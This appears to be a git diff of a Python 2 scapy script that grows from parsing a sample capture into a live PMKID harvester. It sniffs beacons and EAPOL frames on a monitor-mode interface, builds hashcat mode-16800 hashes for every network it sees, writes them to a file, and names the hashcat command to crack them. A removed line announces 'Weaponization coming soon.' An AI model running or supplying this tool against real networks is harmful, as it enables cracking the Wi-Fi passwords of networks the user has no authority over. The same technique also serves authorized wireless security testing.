@@ -1,48 +1,77 @@
 #!/usr/bin/python2
+"""
+./hashcat64.bin -m 16800 hashes.file -a 3 -w 3 <psk>
 
+Adjust under __main__ accordingly prior to launch
+"""
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 import packetEssentials as PE
+import os
 
-pkts = rdpcap('wpa-Induction.pcap')
-essid = 'Coherer'
-psk = 'Induction'
+## Dict setup
+essidDict = {}
+pmkDict = {}
 
-eapols = []
-for i in pkts:
-    if i.haslayer(EAPOL):
-        eapols.append(i)
-  
-ourPkt = None
-for i in eapols:
-    
-    ## AES == 89, TKIP == 8a
-    if PE.pt.byteRip(i[Raw], qty = 3)[6:] == '89' or\
-       PE.pt.byteRip(i[Raw], qty = 3)[6:] == '8a':
-        ourPkt = i
+## FS cleanup
+try:
+    os.remove('hashes.file')
+except:
+    pass
 
-if ourPkt is not None:
-    pmkid = PE.pt.byteRip(ourPkt[Raw].load,
+def pmkRip(packet):
+    """Attempt to rip the PMKID"""
+    pmkid = PE.pt.byteRip(packet[Raw].load,
                           order = 'last',
                           qty = 16,
                           compress = True)
     if pmkid[-1] != 0:
-        
-        ## Set PMKID
-        ourHash = pmkid + '*'
-        
-        ## BSSID
-        ourHash += i[Dot11].addr1.replace(':', '') + '*'
-        
-        ## Tgt MAC
-        ourHash += i[Dot11].addr2.replace(':', '') + '*'
-        
-        ## ESSID
-        ourHash += 'Coherer'.encode('hex')
+        return pmkid
+    else:
+        return False
 
-with open('ourHash', 'w') as oFile:
-    oFile.write(ourHash + '\n')
 
-print ("\n\nAnalysis complete, Password for this example is Induction")
-print ("./hashcat64.bin -m 16800 ourHash -a 3 -w 3 Induction")
-print ("\nStay tuned...  Weaponization coming soon")
-        
+def pHandler(packet):
+    """Packet Handler"""
+    ## BEACONS
+    if packet.haslayer(Dot11Beacon):
+        ## ESSID MAC: ESSID
+        essidDict.update({packet[Dot11].addr2: packet[Dot11Elt].info})
+    
+    ## EAPOLs
+    elif packet.haslayer(EAPOL):
+        ## AES == 89, TKIP == 8a
+        if PE.pt.byteRip(packet[Raw], qty = 3)[6:] == '89' or\
+            PE.pt.byteRip(packet[Raw], qty = 3)[6:] == '8a':
+            
+            ## Assume we've already seen the beacon, ignore chicken/egg scenario
+            pmkID = pmkRip(packet)
+            if pmkID is not False:
+                ## ESSID MAC: packet
+                pmkDict.update({packet[Dot11].addr2: packet})
+                
+                ## Set PMKID
+                ourHash = pmkID + '*'
+                
+                ## BSSID
+                ourHash += packet[Dot11].addr2.replace(':', '') + '*'
+                
+                ## Tgt MAC
+                ourHash += packet[Dot11].addr1.replace(':', '') + '*'
+                
+                ## ESSID
+                try:
+                    ourHash += essidDict.get(packet[Dot11].addr2).encode('hex')
+                    print ourHash + ' -- ' + essidDict.get(packet[Dot11].addr2) + ' -- ' + packet[Dot11].addr2 + '\n'
+                    with open('hashes.file', 'a') as oFile:
+                        oFile.write(ourHash + '\n')
+                except:
+                    pass
+                
+
+if __name__ == '__main__':
+    p = sniff(iface = 'wlan1mon',
+              prn = pHandler,
+              lfilter = lambda x: x.haslayer(Dot11Beacon) or x.haslayer(EAPOL),
+              store = 0)
